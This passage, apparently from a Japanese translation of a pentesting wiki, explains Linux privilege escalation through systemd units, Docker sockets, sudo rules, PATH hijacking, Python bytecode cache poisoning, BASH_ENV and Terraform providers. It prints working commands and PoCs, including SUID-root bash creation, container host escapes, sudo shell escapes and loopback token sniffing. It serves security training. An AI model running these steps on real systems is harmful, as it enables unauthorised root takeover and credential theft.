たとえば、.service ファイル内に **`ExecStart=/tmp/script.sh`** を指定してバックドアを作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに**書き込み権限**がある場合、それらをバックドアに置き換えられる点に注意してください。サービスが再実行されると、バックドアが実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH は、次の方法で確認できます。

```bash
systemctl show-environment
```

パス上のいずれかのフォルダーに**書き込み**できる場合、**権限昇格**できる可能性があります。次のようなサービス設定ファイルで使用されている**相対パス**を探す必要があります：

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

次に、書き込み可能な systemd PATH フォルダー内に、相対パスのバイナリと**同じ名前の実行ファイル**を作成します。サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）を実行するよう要求されると、**backdoor が実行されます**（通常、権限のないユーザーはサービスを開始／停止できませんが、`sudo -l` で可能か確認してください）。

**サービスについて詳しくは `man systemd.service` を参照してください。**

## **Timers**

**Timers** は、名前が `**.timer**` で終わる systemd unit ファイルです。`**.service**` ファイルやイベントを制御します。**Timers** は cron の代替として使用できます。カレンダー時刻のイベントと単調増加時刻のイベントを標準でサポートし、非同期で実行できます。

すべての timers は次のコマンドで列挙できます。

```bash
systemctl list-timers --all
```

### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit のいくつかのユニット（`.service` や `.target` など）を実行させることができます。

```bash
Unit=backdoor.service
```

ドキュメントでは、Unitについて次のように説明されています。

> タイマーの期限が切れたときに有効化するunit。引数はunit名で、サフィックスは「.timer」ではありません。指定しない場合、この値はタイマーユニットと同じ名前（サフィックスを除く）のサービスになります。（上記を参照。）有効化されるunit名とタイマーユニット名は、サフィックスを除いて同じ名前にすることが推奨されています。

したがって、この権限を悪用するには、次のものが必要です。

- **書き込み可能なバイナリを実行している**systemd unit（`.service`など）を見つける
- **相対パスを実行している**systemd unitを見つけ、**systemd PATH**に対する**書き込み権限**を持っている（その実行ファイルになりすますため）

**タイマーについて詳しくは `man systemd.timer` を参照してください。**

### **タイマーの有効化**

タイマーを有効化するには、root権限を取得して次を実行します。

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Note: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成すると **有効化** されます。

## Sockets

Unix Domain Sockets (UDS) は、クライアントサーバーモデルにおいて、同一または異なるマシン上の **プロセス間通信** を可能にします。コンピューター間の通信には標準の Unix descriptor files を使用し、`.socket` ファイルを通じて設定されます。<sup>[[14]](#references)</sup>

Sockets は `.socket` ファイルを使って設定できます。

**`man systemd.socket` で sockets の詳細を確認してください。** このファイルでは、次のような興味深いパラメーターを設定できます。

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`: これらのオプションはそれぞれ異なりますが、socket が **どこで待ち受けるかを指定する** ものです（AF_UNIX socket ファイルのパス、待ち受ける IPv4/6 アドレスやポート番号など）。
- `Accept`: boolean 引数を取ります。**true** の場合、**受信接続ごとにサービスインスタンスが起動され**、接続 socket のみがそのインスタンスに渡されます。**false** の場合、待ち受け中の socket 自体がすべて **起動した service unit に渡され**、すべての接続に対して service unit が 1 つだけ起動されます。データグラム socket と FIFO では、この値は無視され、単一の service unit が無条件にすべての受信トラフィックを処理します。**デフォルトは false** です。パフォーマンス上の理由から、新しい daemon は `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`、`ExecStartPost`: 1 つ以上のコマンドラインを指定し、それぞれ待ち受け用の **socket** / FIFO が作成されて bind される **前** または **後** に **実行** します。コマンドラインの最初のトークンは絶対ファイル名で、その後にプロセスの引数が続きます。
- `ExecStopPre`、`ExecStopPost`: 待ち受け用の **socket** / FIFO が閉じられて削除される **前** または **後** に **実行** する追加の **コマンド** です。
- `Service`: **受信トラフィック** によって **有効化する** **service** unit 名を指定します。この設定は `Accept=no` の socket でのみ使用できます。デフォルトでは、socket と同じ名前（suffix を置き換えたもの）の service が使われます。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

**書き込み可能** な `.socket` ファイルが見つかった場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような設定を **追加** できます。すると、socket が作成される前に backdoor が実行されます。そのため、**マシンが再起動されるまで待つ必要があるでしょう。**\
_システムがその socket ファイルの設定を使用していなければ、backdoor は実行されないことに注意してください。_

### Socket activation + writable unit path (create missing service)

影響の大きい別の設定ミスは次のとおりです。

- `Accept=no` で `Service=<name>.service` が指定された socket unit
- 参照先の service unit が存在しない
- 攻撃者が `/etc/systemd/system`（または別の unit 検索パス）に書き込める

この場合、攻撃者は `<name>.service` を作成し、socket にトラフィックを送ることで、systemd に新しい service を root として読み込ませて実行させることができます。

簡単な流れ:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 書き込み可能なソケット

**書き込み可能なソケット**（ここでは Unix ソケットのことで、設定用の `.socket` ファイルではありません）を**特定できた場合**、そのソケットと通信して、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙

```bash
netstat -a -p --unix
```

### 生の接続

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**悪用例：**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTPソケット

HTTPリクエストを待ち受けている**ソケット**が存在する場合があります（`.socket`ファイルのことではなく、Unixソケットとして機能するファイルのことです）。次の方法で確認できます：

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

ソケットが**HTTP**リクエストに応答する場合、そのソケットと**通信**でき、場合によっては**脆弱性を悪用**できる可能性があります。

### 書き込み可能な Docker ソケット

Docker ソケットは、通常 `/var/run/docker.sock` にあり、保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込みアクセス権があると、権限昇格につながる可能性があります。以下では、その方法と Docker CLI が使えない場合の代替手段について説明します。

#### **Docker CLI による権限昇格**

Docker ソケットへの書き込みアクセス権がある場合、次のコマンドを使用して権限を昇格できます。<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

これらのコマンドを使うと、ホストのファイルシステムに root 権限でアクセスできるコンテナを実行できます。

#### **Docker APIを直接使用する**

Docker CLIを利用できない場合でも、Unixソケット経由でraw HTTPを使えば、Docker socketを悪用できます。最も確実な手順は次のとおりです。

- ホストのrootディレクトリをbind mountした、長時間実行するヘルパーコンテナを作成する
- そのコンテナを起動する
- そのヘルパー内に`exec`インスタンスを作成する
- `exec`インスタンスを起動し、API経由で出力を読み取る

**Dockerイメージを一覧表示する**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**ヘルパーコンテナを作成して起動する**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**exec インスタンスを作成する**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec インスタンスを起動して出力を読み取る**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

このパターンは通常、`socat` や `nc -U` を使って手動で `attach` を操作するよりも堅牢です。`/:/host` を使ってヘルパーを作成できれば、追加の `exec` インスタンスを使って `/host/root/...` などのファイルを読み取ったり、`/host/root/.ssh` に SSH キーを追加したり、ホストの起動ファイルを変更したりできます。

### その他

**`docker` グループに所属しているため**に Docker ソケットへの書き込み権限がある場合、[**権限を昇格させる方法がさらにあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**Docker API がポートで待ち受けている**場合は、これを侵害できる可能性もあります](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**コンテナから脱出する方法や、コンテナランタイムを悪用して権限を昇格させる方法**については、こちらも確認してください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) による権限昇格

**`ctr`** コマンドを使用できる場合は、以下のページを確認してください。**これを悪用して権限を昇格できる可能性があります**。


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** による権限昇格

**`runc`** コマンドを使用できる場合は、以下のページを確認してください。**これを悪用して権限を昇格できる可能性があります**。


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、高度な**プロセス間通信（IPC）システム**であり、アプリケーションが効率的に連携し、データを共有できるようにします。最新の Linux システムを念頭に設計されており、さまざまな形式のアプリケーション間通信に対応する堅牢なフレームワークを提供します。<sup>[[16]](#references)</sup>

このシステムは汎用性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートしています。その仕組みは、**拡張された UNIX ドメインソケット**に似ています。さらに、イベントやシグナルのブロードキャストにも対応しており、システムコンポーネント間のシームレスな連携を促進します。たとえば、Bluetooth デーモンから着信を知らせるシグナルを受け取ると、音楽プレーヤーがミュートになり、ユーザー体験を向上させることができます。また、D-Bus はリモートオブジェクトシステムにも対応しており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は**許可／拒否モデル**で動作し、一致するポリシールールの累積的な結果に基づいて、メッセージの権限（メソッド呼び出し、シグナルの送信など）を管理します。ポリシーはバスとのやり取りを指定するものであり、権限を悪用して権限昇格できる可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーの例を以下に示します。このポリシーでは、root ユーザーに対し、`fi.w1.wpa_supplicant1` の所有、メッセージの送信、およびメッセージの受信を許可しています。

ユーザーまたはグループが指定されていないポリシーは、すべてのユーザーとグループに適用されます。一方、「default」コンテキストのポリシーは、他の特定のポリシーの対象になっていないすべてに適用されます。

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus communication の列挙と悪用方法はこちら:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙して、マシンがどのような位置にあるかを把握するのは、いつでも興味深いことです。

### 一般的な列挙

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

アクティブな `/etc/inetd.conf` エントリが GNU Inetutils の `telnetd` を root として実行する場合は、ポートがループバックのみにバインドされている場合でも、設定されたバイナリのバージョンとローカルリスナーを確認してください。GNU Inetutils 1.9.3 から 2.7 には、クライアントが指定した `USER` が `login -f` に渡される [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) がありました（CVE-2026-24061）。プロセスやバージョン文字列は兆候にすぎません。公開状態と判断する前に、ベンダーのパッチ適用状況と実際のデーモンを確認してください。詳しくは [Telnet ガイド](../../../network-services-pentesting/pentesting-telnet.md)を参照してください。

### アウトバウンドフィルタリングの簡易トリアージ

ホストでコマンドを実行できるもののコールバックに失敗する場合は、DNS、トランスポート、プロキシ、ルートの各フィルタリングをすばやく切り分けてください。

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 開いているポート

アクセスする前にやり取りできなかった、そのマシン上で動作しているネットワークサービスを必ず確認してください。

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

リスナーをバインド先で分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: ローカルのみ（トンネル／ポートフォワードの候補として適しています）。
- 特定の内部IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみ到達できます。

### ローカル限定サービスのトリアージ手順

ホストを侵害すると、`127.0.0.1` にバインドされたサービスに、初めてシェルからアクセスできる場合があります。手早く確認するには、次のローカル手順を使います。

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### ネットワークスキャナーとしてのLinPEAS（ネットワーク専用モード）

ローカルのPEチェックに加えて、linPEASはネットワークに特化したスキャナーとして実行できます。`$PATH`にあるバイナリ（通常は`fping`、`ping`、`nc`、`ncat`）を使用し、ツールをインストールすることはありません。

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` を付けずに `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋なネットワークスキャナーとして動作します（残りの権限昇格チェックはスキップされます）。

### Sniffing

トラフィックを sniff できるか確認してください。可能であれば、認証情報を取得できる場合があります。

```
timeout 1 tcpdump
```

手早く実践的な確認：

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback（`lo`）は、内部限定の多くのサービスがトークン、Cookie、認証情報を公開するため、post-exploitationで特に重要です。

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

今キャプチャして、後で解析:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## ユーザー

### 一般的な列挙

自分が**誰**なのか、どのような**権限**を持っているのか、システム上にどのような**ユーザー**がいるのか、どのユーザーが**ログイン**できるのか、そしてどのユーザーが**root 権限**を持っているのかを確認します。

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### 大きなUID

一部のLinuxバージョンには、**UID > INT_MAX** のユーザーが権限昇格できるバグがありました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**これをExploitする**には、次を使用します: **`systemd-run -t /bin/bash`**

### グループ

root権限を取得できる可能性のある**グループのメンバー**かどうかを確認してください:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### クリップボード

クリップボード内に興味深い情報がないか確認してください（可能な場合）

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### パスワードポリシー

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### 既知のパスワード

環境内の**パスワードを知っている**場合は、そのパスワードを使って各ユーザーとしてログインを試してください。

### Su Brute

大量のノイズが発生しても構わず、コンピューター上に`su`と`timeout`のバイナリがある場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使ってユーザーの brute-force を試せます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)も、`-a`パラメーターを指定するとユーザーの brute-force を試します。

## 書き込み可能な PATH の悪用

### $PATH

**$PATH内のフォルダーに書き込める**場合は、別のユーザー（理想的にはroot）が実行するコマンドの名前を付けたバックドアを、書き込み可能なフォルダー内に**作成する**ことで、権限昇格できる可能性があります。ただし、そのコマンドが、$PATH内で書き込み可能なフォルダーより前にあるフォルダーから読み込まれないことが条件です。

### SUDO と SUID

sudoを使ってコマンドを実行できる場合や、そのコマンドにsuidビットが設定されている場合があります。次のコマンドで確認してください：

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

一部の**予想外のコマンドでは、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能です**。<sup>[[8]](#references)</sup> たとえば、

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudoの設定によっては、ユーザーがパスワードを知らなくても、別のユーザーの権限で特定のコマンドを実行できる場合があります。

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

この例では、ユーザー demo は vim を root として実行できるため、root ディレクトリに ssh key を追加するか、sh を呼び出すだけで簡単にシェルを取得できます。

```
sudo vim -c '!sh'
```

### sudo スクリプト内の引用符なし Bash 比較

Bash では、`[[ "$protected" == $candidate ]]` の右辺はパターンとして扱われます。root 権限で実行可能な sudo スクリプトが、呼び出し元が制御できるファイルから `candidate` を設定する場合、`prefix*` のような値が保護対象の文字列の先頭部分に一致することがあります。成功時とエラー時の処理が異なると、prefix oracle が露呈する可能性があります。リテラルな等価性を意図する場合は、右辺を引用符で囲みます（`[[ "$protected" == "$candidate" ]]`）。引用符なしの比較を悪用可能と判断する前に、実際の sudo 引数、入力の出所、外部から観測できる分岐動作を確認してください。[GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) には、このパターンの動作が定義されています。

### sudo で実行する PrusaSlicer プロジェクトファイル

呼び出し元がスライス対象の `.3mf` プロジェクトを選択できる場合、`prusaslicer` または `prusa-slicer` を制限なく root 権限で実行できる sudo 許可は、確認が必要です。プロジェクトには G-code のエクスポート時に実行される後処理スクリプトを含められます。細工されたプロジェクトは、2.6.1 までの PrusaSlicer でコマンドを実行できる可能性があります（[CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)）。権限境界を越えられると結論づける前に、有効な sudo ルール、バイナリのバージョンとベンダーのパッチ、プロジェクトの入手元、該当するエクスポート処理が実行されるかを確認してください。プロジェクト引数が固定されている場合や、有効な `NOEXEC` ポリシーがある場合は、結果が変わる可能性があります。スライサーがインストールされていることだけでは、権限昇格の経路があるとは判断できません。

### SETENV

このディレクティブにより、ユーザーは何かを実行する際に**環境変数を設定**できます。

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

この例は、**HTB machine Admirerをベースにしており**、スクリプトをrootとして実行する際に任意のPythonライブラリをロードする**PYTHONPATH hijacking**に**脆弱でした**：

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudoでの実行が許可された Python の import における書き込み可能な `__pycache__` / `.pyc` poisoning

**sudoでの実行が許可された Python スクリプト**が、パッケージディレクトリに**書き込み可能な `__pycache__`**を含むモジュールを import している場合、キャッシュされた `.pyc` を置き換え、次回の import 時に特権ユーザーとして code execution を得られる可能性があります。<sup>[[30]](#references)</sup>

- 仕組み:
  - CPython はバイトコードのキャッシュを `__pycache__/module.cpython-<ver>.pyc` に保存します。<sup>[[31]](#references)</sup>
  - インタープリターは **ヘッダー**（magic + ソースに紐づくタイムスタンプ/hash メタデータ）を検証し、その後、ヘッダーに続く部分に保存された marshal 化されたコードオブジェクトを実行します。
  - ディレクトリが書き込み可能で、キャッシュファイルを**削除して再作成**できる場合、root 所有で書き込み不可の `.pyc` でも置き換えられます。
- よくあるパス:
  - `sudo -l` に、root として実行できる Python スクリプトまたは wrapper が表示される。
  - そのスクリプトが `/opt/app/`、`/usr/local/lib/...` などからローカルモジュールを import する。
  - import されるモジュールの `__pycache__` ディレクトリが、あなたのユーザーまたは全ユーザーに対して書き込み可能である。

簡易的な列挙:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

特権スクリプトを調査できる場合は、インポートされたモジュールとそのキャッシュパスを特定します:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

悪用の手順:

1. sudo で実行できる script を一度実行し、Python に正規のキャッシュファイルを作成させます（まだ存在しない場合）。
2. 正規の `.pyc` の先頭16バイトを読み取り、汚染したファイルに再利用します。
3. payload の code object をコンパイルして `marshal.dumps(...)` でシリアライズし、元のキャッシュファイルを削除して、元のヘッダーと悪意のある bytecode を組み合わせて再作成します。
4. sudo で実行できる script をもう一度実行し、import 時に payload を root として実行させます。

重要な注意事項:

- 元のヘッダーを再利用することが重要です。Python はキャッシュのメタデータとソースファイルを照合しますが、bytecode の本体が実際にソースと一致するかどうかは確認しません。
- ソースファイルが root 所有で書き込み不可でも、格納先の `__pycache__` ディレクトリが書き込み可能な場合に特に有効です。
- `PYTHONDONTWRITEBYTECODE=1` と `python -B` は、Python に新しい `.pyc` ファイルを書き込ませないための設定です。すでに存在する有効なキャッシュが、攻撃者に置き換えられていても、その読み込みは阻止しません。重要なのは、低い権限のユーザーが、特権での import に受け入れられるキャッシュを置き換えられるかどうかです。Python は、キャッシュされた bytecode を読み込む前に、タイムスタンプ／サイズまたはハッシュのメタデータを確認します。詳しくは [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) と [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) を参照してください。

最小限の proof-of-concept の構成:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

ハードニング:

- 特権ユーザーの Python import path 内に、低権限ユーザーが書き込み可能なディレクトリがないことを確認してください。`__pycache__` も対象です。
- 既存の `.pyc` ファイルも含め、cache directory の所有者と権限を監査してください。bytecode の書き込みを無効にすれば、新たな cache の作成を減らせますが、置き換え可能な既存の cache への対策にはなりません。
- 書き込み可能なローカル Python module や cache directory は、root で実行される書き込み可能な shell script や shared library と同様に扱ってください。

### sudo env_keep で保持された BASH_ENV → root shell

sudoers が `BASH_ENV` を保持する場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、Bash の非対話型起動時の動作を利用して、許可されたコマンドの実行時に任意のコードを root として実行できます。<sup>[[24]](#references)</sup>

- 仕組み: 非対話型 shell では、Bash は対象の script を実行する前に `$BASH_ENV` を評価し、そのファイルを source します。多くの sudo ルールでは、script や shell wrapper の実行が許可されています。`BASH_ENV` が sudo によって保持されると、そのファイルは root 権限で source されます。<sup>[[23]](#references)</sup>

- 要件:
  - 実行可能な sudo ルール（非対話型で `/bin/bash` を呼び出す対象、または任意の bash script）。
  - `env_keep` に `BASH_ENV` が含まれていること（`sudo -l` で確認）。

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- 強化:
  - `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
  - sudo で許可されたコマンドに shell wrappers を使用せず、最小限のバイナリを使う。
  - 保持された環境変数が使用された場合に備え、sudo の I/O logging と alerting を検討する。

### sudo 経由で、保持された HOME を使う Terraform（!env_reset）

sudo で、より高い権限を持つユーザーとして Terraform を実行できる場合、`!env_reset` は、そのルールで実際にどの環境変数が保持されるかを確認する手がかりになります。呼び出し元が書き込み可能な `.terraformrc` または `terraform.rc` を有効な CLI 設定として扱う前に、実効的な `HOME` または `TF_CLI_CONFIG_FILE` を確認してください。`provider_installation.dev_overrides` のエントリが意味を持つのは、その Terraform コマンドが該当 provider を読み込み、呼び出し元が選択されたディレクトリにその実行ファイルを配置できる場合に限られます。<sup>[[25]](#references)</sup>

- 必要な provider を書き込み可能なディレクトリに向け、その provider 名を付けた悪意のある plugin（例：`terraform-provider-examples`）を配置します。

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root として実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

